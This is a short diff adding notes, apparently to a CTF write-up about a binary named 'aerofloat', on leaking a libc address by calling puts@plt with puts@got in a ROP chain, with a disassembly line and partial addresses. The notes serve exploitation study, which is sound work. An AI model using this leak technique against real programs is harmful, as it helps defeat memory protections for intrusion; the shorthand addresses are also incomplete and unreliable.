@@ -255,3 +255,13 @@ $ ldd -r -v aerofloat
 ```py
 p = process('./aerofloat', env = {'LD_PRELOAD' : './libc.so.6 ./ld-linux-x86-64.so.2'})
 ```
+
+### libc leak via puts (ropchain)
+```
+puts@plt(puts@got)
+puts@plt:
+   0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018
+   
+0x040430(*0x04018),
+0x04018 = 0x7f......
+```
